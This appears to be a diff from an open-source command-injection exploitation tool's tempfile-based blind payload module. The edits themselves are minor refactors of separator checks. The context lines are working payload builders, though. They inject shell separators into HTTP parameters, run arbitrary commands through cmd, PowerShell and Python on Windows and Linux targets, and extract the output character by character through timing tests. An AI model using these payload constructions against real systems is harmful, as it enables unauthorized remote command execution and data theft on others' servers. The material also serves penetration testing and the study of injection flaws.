@@ -27,7 +27,7 @@ Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
@@ -50,7 +50,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       pass
 
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -98,7 +98,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
@@ -121,7 +121,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
       pass
 
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
@@ -164,7 +164,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -201,7 +201,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       pass
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + " > " + OUTPUT_TEXTFILE + separator +
@@ -259,7 +259,7 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -286,7 +286,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
       pass
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
@@ -328,7 +328,7 @@ Get the execution output, of shell execution.
 """
 def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
@@ -348,7 +348,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     else:
       pass
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -393,7 +393,7 @@ __Warning__: The alternative shells are still experimental.
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -415,7 +415,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
       pass
 
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
@@ -452,7 +452,7 @@ Get the execution output, of shell execution.
 """
 def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
@@ -473,7 +473,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       pass
 
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
@@ -511,7 +511,7 @@ __Warning__: The alternative shells are still experimental.
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
-    if separator == "|" or separator == "||" :
+    if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -531,7 +531,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     else:
       pass
   else:
-    if separator == ";"  or separator == "%0a" :
+    if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
